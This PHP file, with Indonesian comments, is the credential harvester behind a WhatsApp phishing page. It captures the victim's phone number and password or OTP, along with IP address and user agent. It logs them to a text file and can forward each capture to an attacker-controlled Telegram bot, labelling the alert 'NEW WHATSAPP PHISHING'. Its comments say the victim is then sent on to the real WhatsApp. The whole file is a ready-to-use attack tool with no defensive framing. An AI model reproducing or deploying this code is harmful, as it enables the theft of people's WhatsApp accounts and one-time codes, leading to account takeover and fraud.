<?php
// Konfigurasi
$logFile = 'results.txt';
$telegramToken = ''; // Isi kalo mau pake Telegram bot
$chatId = ''; // Isi chat ID lo

// Ambil data dari form
$phone = isset($_POST['phone']) ? $_POST['phone'] : '';
$password = isset($_POST['password']) ? $_POST['password'] : '';
$ip = $_SERVER['REMOTE_ADDR'];
$userAgent = $_SERVER['HTTP_USER_AGENT'];
$date = date('Y-m-d H:i:s');

// Data lengkap
$data = "========================================\n";
$data .= "📱 TARGET: WHATSAPP\n";
$data .= "📅 WAKTU: $date\n";
$data .= "🌐 IP: $ip\n";
$data .= "📱 USER AGENT: $userAgent\n";
$data .= "📞 NOMOR: $phone\n";
$data .= "🔑 PASSWORD/OTP: $password\n";
$data .= "========================================\n\n";

// Simpan ke file
file_put_contents($logFile, $data, FILE_APPEND);

// Kirim ke Telegram (opsional)
if($telegramToken && $chatId) {
    $message = "🔴 *NEW WHATSAPP PHISHING* 🔴\n\n";
    $message .= "📞 *Nomor:* $phone\n";
    $message .= "🔑 *Password:* $password\n";
    $message .= "🌐 *IP:* $ip\n";
    $message .= "📅 *Waktu:* $date\n";
    
    $url = "https://api.telegram.org/bot$telegramToken/sendMessage";
    $data = ['chat_id' => $chatId, 'text' => $message, 'parse_mode' => 'Markdown'];
    
    $options = [
        'http' => [
            'header' => "Content-type: application/x-www-form-urlencoded\r\n",
            'method' => 'POST',
            'content' => http_build_query($data)
        ]
    ];
    
    $context = stream_context_create($options);
    file_get_contents($url, false, $context);
}

// Return response (redirect ke WA asli)
echo json_encode(['status' => 'success']);
?>